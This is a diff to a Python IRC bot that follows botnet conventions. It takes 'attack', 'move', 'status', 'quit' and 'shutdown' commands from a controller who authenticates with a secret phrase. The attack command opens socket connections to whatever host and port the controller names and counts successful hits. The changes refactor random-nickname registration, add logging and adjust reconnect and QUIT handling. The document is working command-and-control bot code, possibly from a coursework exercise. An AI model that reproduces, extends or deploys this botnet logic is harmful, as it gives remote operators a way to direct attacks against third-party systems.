@@ -39,7 +39,7 @@ def cmd_attack(host, port, con_nick):
 	try:
 		if not port.isdigit():
 			print("Error: specified port is not a digit")
-			return_status(nick + " failure")
+			return_status(nick + " failure", con_nick)
 			return
 		port = int(port)
 		target.connect((host,port))
@@ -48,6 +48,7 @@ def cmd_attack(host, port, con_nick):
 		atk_cnt += 1
 	#failed to attack
 	except socket.error:
+		print("Error: could not attack '" + host + "'")
 		return_status(nick + " failure", con_nick)
 	return
 
@@ -58,11 +59,11 @@ def cmd_move(host, port_num, chan, con_nick):
 	chan = "#" + chan
 	if hostname == host and port == port_num:
 		return_status(nick + " success", con_nick)
+		send(irc, "QUIT\n")
 		channel = chan
 		send(irc, "NICK " + nick + "\n")
 		send(irc, "JOIN " + channel + "\n")
 	else:
-		chan = "#" + chan
 		old_host = hostname
 		old_port = port
 		old_channel = channel
@@ -87,7 +88,6 @@ def cmd_move(host, port_num, chan, con_nick):
 			channel = old_channel
 			return_status(nick + " success", con_nick)
 			channel = chan
-			send(irc, "QUIT I will live on.../n")
 			irc.close()
 			irc = temp_irc
 	return
@@ -105,7 +105,6 @@ def cmd_shutdown(con_nick):
 	active = False
 	#tell controller quitting and disconnect
 	return_status(nick + " shutdown", con_nick)
-	send(irc, "QUIT you killed me... /n")
 	return
 
 
@@ -121,7 +120,6 @@ def rcv_command(sock):
 	while True:
 		try:
 			msg = sock.recv(1024).decode('UTF-8', 'ignore').strip()
-			print(msg)
 			#ping pong protocol
 			if msg.find('PING') != -1:
 				send(irc, 'PONG ' + msg.split()[1] + '\r\n')
@@ -152,6 +150,15 @@ def return_status(msg, con_nick):
 	send(irc, "PRIVMSG " + con_nick + " :" + msg + "\n")
 	return
 	
+
+def register_new_nick(sock):
+	global nick
+	suffix = random.randint(0, 10000)
+	nick = "V" + str(suffix)
+	send(sock, "USER " + nick + " " + nick + " " + nick + ": This bot is connecting\n")
+	send(sock, "NICK " + nick + "\n")
+	send(sock, "JOIN " + channel + "\n")
+					
 	
 #connect to the specified IRC server and channel
 def connect(sock, host, port):
@@ -170,15 +177,7 @@ def connect(sock, host, port):
 		print("Error: connection could not be made")
 		return ERROR_FLAG
 	#register with IRC until free nickname is found
-	while (True):
-		send(sock, "USER " + nick + " " + nick + " " + nick + ": This bot is connecting\n")
-		send(sock, "NICK " + nick + "\n")
-		send(sock, "JOIN " + channel + "\n")
-		if rcv_command(sock).find("already in use") != -1:
-			suffix = random.randint(0, 10000)
-			nick = "V" + str(suffix)
-		else:
-			break
+	register_new_nick(sock)
 	return 
 
 
@@ -194,34 +193,39 @@ def handle_connection():
 	while active:
 		#wait for commands
 		cmd = rcv_command(irc)
+		if cmd.find("already in use") != -1:
+			register_new_nick(irc)
 		cmd = cmd.split()
 		#interpret command
-		if cmd == "\n":
+		if cmd == "\n" or len(cmd) == 0:
 			pass
 		elif cmd[len(cmd)-1] == secret_phrase:
 			if cmd[0] == "status":
+				print("received command: " + cmd[0])
 				cmd_status(cmd[len(cmd)-2])
 			elif cmd[0] == "attack":
+				print("received command: " + cmd[0])
 				try:
 					cmd_attack(cmd[1], cmd[2], cmd[len(cmd)-2])
 				except IndexError:
 						print("Error: Insufficient arguments for cmd(attack)")	
 			elif cmd[0] == "move":
+				print("received command: " + cmd[0])
 				try:
 					cmd_move(cmd[1], cmd[2], cmd[3], cmd[len(cmd)-2])
 				except IndexError:
 					print("Error: Insufficient arguments for cmd(move)")	
 			elif cmd[0] == "quit":
+				print("received command: " + cmd[0])
 				cmd_quit(cmd[len(cmd)-2])
 			elif cmd[0] == "shutdown":
+				print("received command: " + cmd[0])
 				cmd_shutdown(cmd[len(cmd)-2])
-			elif con_active == False:
-				print("Error: Connection is dead")
-				break
 			else:
 				print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
-		else:
-			print("Error: unauthorized controller")
+			if con_active == False:
+				print("Error: Connection is dead")
+				break
 	return
 
 
@@ -254,6 +258,7 @@ def main():
 			handle_connection()
 		#if handle_connection exited without shutdown command
 		if active == True:
+			print("connection was dropped")
 			#wait 5 seconds before retrying connection
 			time.sleep(5)
 		else:
